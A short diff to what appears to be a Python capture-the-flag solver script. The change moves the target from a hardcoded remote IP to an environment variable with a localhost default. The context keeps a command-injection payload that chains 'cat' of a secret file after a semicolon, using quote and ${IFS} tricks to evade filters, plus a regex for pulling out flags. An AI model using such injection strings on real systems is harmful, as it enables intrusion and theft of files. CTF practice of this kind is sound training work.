@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 import atexit
+import os
 atexit.register(lambda: print("作者 ZluxYao"))
 
 
@@ -12,7 +13,7 @@ from urllib.parse import quote
 import requests
 
 
-DEFAULT_URL = "http://47.120.61.230:33409/"
+DEFAULT_URL = os.environ.get("GKD_URL") or ("http://127.0.0.1:33409/")
 DEFAULT_PAYLOAD = "127.0.0.1;c'a't${IFS}s3cr3t_out.txt"
 FLAG_RE = re.compile(r"TOGOGO-flag\{[^}\r\n]+\}")
 
